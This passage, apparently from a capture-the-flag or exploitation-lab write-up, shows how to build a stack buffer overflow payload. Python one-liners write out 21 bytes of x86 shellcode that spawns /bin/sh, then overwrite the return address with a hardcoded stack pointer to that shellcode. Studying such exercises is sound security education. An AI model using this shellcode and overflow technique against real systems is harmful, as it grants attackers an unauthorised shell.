## Payload construction 

We fill the first buffer and replacing the first 21 bytes with a shellcode:
```
`python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\xCC"*(40-21)'`
```
We calculate the correct offset to the return address and overwrite it with a pointer to the shellcode in the first buffer:
```
`python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\xCC"*(40-21)'`  `python -c 'print "AAAABBBBCCCCDDDDEE" + "\xb0\xf5\xff\xbf" + "FFGGGGG"'`
